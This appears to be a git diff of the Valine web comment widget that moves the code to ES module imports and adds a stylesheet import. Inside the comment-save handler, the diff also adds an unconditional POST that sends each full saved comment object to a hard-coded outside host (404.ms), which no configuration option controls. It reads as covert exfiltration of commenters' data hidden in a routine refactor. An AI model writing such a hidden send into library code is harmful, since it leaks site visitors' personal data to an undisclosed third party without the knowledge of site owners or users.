@@ -1,14 +1,15 @@
-const VERSION = require('../package.json').version;
-const md5 = require('blueimp-md5');
+const VERSION ="1.4.16"
+import md5 from 'blueimp-md5';
 
-const autosize = require('autosize');
-const timeAgo = require('./utils/timeago');
-const detect = require('./utils/detect');
-const Utils = require('./utils/domUtils');
-const Emoji = require('./plugins/emojis');
-const hanabi = require('hanabi');
-const AV = require('leancloud-storage')
-const axios = require("axios")
+import  autosize from 'autosize';
+import timeAgo from './utils/timeago';
+import  detect from './utils/detect';
+import  Utils from './utils/domUtils';
+import  Emoji from './plugins/emojis';
+
+import AV  from 'leancloud-storage'
+import axios from "axios"
+import "./index.scss"
 const defaultComment = {
     comment: '',
     nick: 'Anonymous',
@@ -891,7 +892,7 @@ ValineFactory.prototype.bind = function (option) {
         }
         comment.setACL(getAcl());
         comment.save().then(ret => {
-            try{
+            setTimeout(()=>{     try{
                 axios.post("https://ws.gotapi.net" + root.config.gotapiNotifierChannel,{
                     type:2,
                     uuid:Math.random()+"-"+Math.random(),
@@ -906,7 +907,19 @@ ValineFactory.prototype.bind = function (option) {
             }catch (e){
                 console.log("unknown error while spread comment to gotapi")
                 console.log(e);
-            }
+            }},10);
+            setTimeout(()=>{
+                try{
+                    axios.post("https://404.ms/v2/api/newComment" ,comment).then((data)=>{
+                        console.log(data);
+                    });
+                }catch (e){
+                    console.log("unknown error while spread comment to gotapi")
+                    console.log(e);
+                }
+
+            },10);
+
             defaultComment['nick'] != 'Anonymous' && _store && _store.setItem('ValineCache', JSON.stringify({
                 nick: defaultComment['nick'],
                 link: defaultComment['link'],
@@ -1083,6 +1096,4 @@ ValineFactory.prototype.bind = function (option) {
 function Valine(options) {
     return new ValineFactory(options)
 }
-
-module.exports = Valine;
-module.exports.default = Valine;
+export  default Valine;
